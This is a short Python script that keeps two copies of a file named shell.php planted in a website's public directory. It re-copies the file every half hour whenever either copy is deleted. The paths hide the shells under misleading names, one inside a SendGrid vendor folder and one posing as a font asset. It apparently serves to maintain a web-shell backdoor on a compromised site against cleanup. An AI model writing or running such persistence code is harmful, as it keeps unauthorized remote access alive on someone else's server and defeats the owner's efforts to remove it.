#!/bin/python
import time
import os
path = "/home/u898607350/domains/freegen.xyz/public_html/manager/inc/sendgrid-php/vendor/sendgrid/php-http-client/use_cases/shell.php"
path2 = "/home/u898607350/domains/freegen.xyz/public_html/manager/assets/fonts/dripicons-v2.php"
i = 0
while True:
		try:
			i +=1
			os.system('echo "{}" >> log.txt'.format(i))
			if os.path.exists(path):
				pass

			else:
				os.system('cp shell.php {}'.format(path))

			if os.path.exists(path2):
				pass

			else:
				os.system('cp shell.php {}'.format(path2))

			time.sleep(1899)

		except Exception as Error:
			os.system('echo "{}" >> log.txt'.format(Error))
